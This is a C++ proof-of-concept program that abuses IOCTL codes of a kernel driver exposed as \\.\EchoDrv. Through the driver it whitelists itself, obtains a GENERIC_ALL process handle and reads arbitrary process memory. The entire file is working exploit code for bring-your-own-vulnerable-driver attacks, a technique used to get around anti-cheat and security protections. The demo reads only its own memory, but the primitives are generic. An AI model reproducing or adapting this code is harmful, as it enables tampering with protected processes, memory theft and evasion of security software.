#include <iostream>
#include <fstream>
#include <Windows.h>
#include <Psapi.h>
 
void raw_read( const HANDLE driver_handle, const uintptr_t process_handle, const uintptr_t src, const LPVOID dst, const size_t size ) {
	struct read_memory_t {
		uintptr_t process_handle;
		uintptr_t src;
		LPVOID dst;
		size_t size;
		size_t* bytes_read;
		char pad[0x40];
	};
 
 
	read_memory_t request{ process_handle, src, dst, size };
	DWORD bytes_read;
 
	DeviceIoControl( driver_handle, 0x60A26124, &request, sizeof( read_memory_t ), &request, sizeof( read_memory_t ), &bytes_read, nullptr );
}
 
template <typename T>
T read( const HANDLE driver_handle, const uintptr_t process_handle, const uintptr_t src ) {
	auto dst = T( );
	raw_read( driver_handle, process_handle, src, &dst, sizeof dst );
 
	return dst;
}
 
 
int main( ) {
	const auto driver_handle = CreateFileW( LR"(\\.\EchoDrv)", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr );
	if ( !driver_handle || driver_handle == INVALID_HANDLE_VALUE ) {
		printf( "[-] Failed fiding driver handle! \n" );
		system( "pause" );
		return -1;
	}
 
	struct init_driver_t {
		char pad[0x30];
	};
 
	init_driver_t init_driver{ };
 
	printf( "[+] driver_handle -> 0x%p\n", driver_handle );
	auto ret = DeviceIoControl( driver_handle, 0x9E6A0594, &init_driver, sizeof init_driver, &init_driver, sizeof init_driver, nullptr, nullptr );
	printf( "[+] whitelist current process status: %i\n", ret );
 
	if ( !ret ) {
		system( "pause" );
		return -1;
	}
 
	struct ob_send_details_t {
		int current_pid;
		int csrss, csrss_two, dwm, idk;
	};
 
	const auto current_pid = static_cast<int>( GetCurrentProcessId( ) );
 
	auto ob_details = ob_send_details_t{ current_pid, 0, 0, 0, 0 };
	ret = DeviceIoControl( driver_handle, 0x252E5E08, &ob_details, sizeof( ob_send_details_t ), nullptr, 0, nullptr, nullptr );
	printf( "[+] ob process status: %i\n", ret );
 
	if ( !ret ) {
		system( "pause" );
		return -1;
	}
	
	struct open_process_t {
		int pid;
		int flag;
		uintptr_t ret_ptr;
		char pad[0x40];
	};
 
	auto ob_pointer = open_process_t{ current_pid, GENERIC_ALL };
	ret = DeviceIoControl( driver_handle, 0xE6224248, &ob_pointer, sizeof( open_process_t ), &ob_pointer, sizeof( open_process_t ), nullptr, nullptr );
	printf( "[+] OpenProcess status: %i, handle: 0x%p \n", ret, ob_pointer.ret_ptr );
 
	if ( !ret ) {
		system( "pause" );
		return -1;
	}
 
	int val = 100;
	const auto val_val = read<int>( driver_handle, ob_pointer.ret_ptr, (uintptr_t)&val );
	printf( "readed val: %i \n", val_val );
 
	printf( "done for now! press a key to stop \n" );
	while ( !getchar( ) )
		Sleep( 100 );
 
	return 0;
}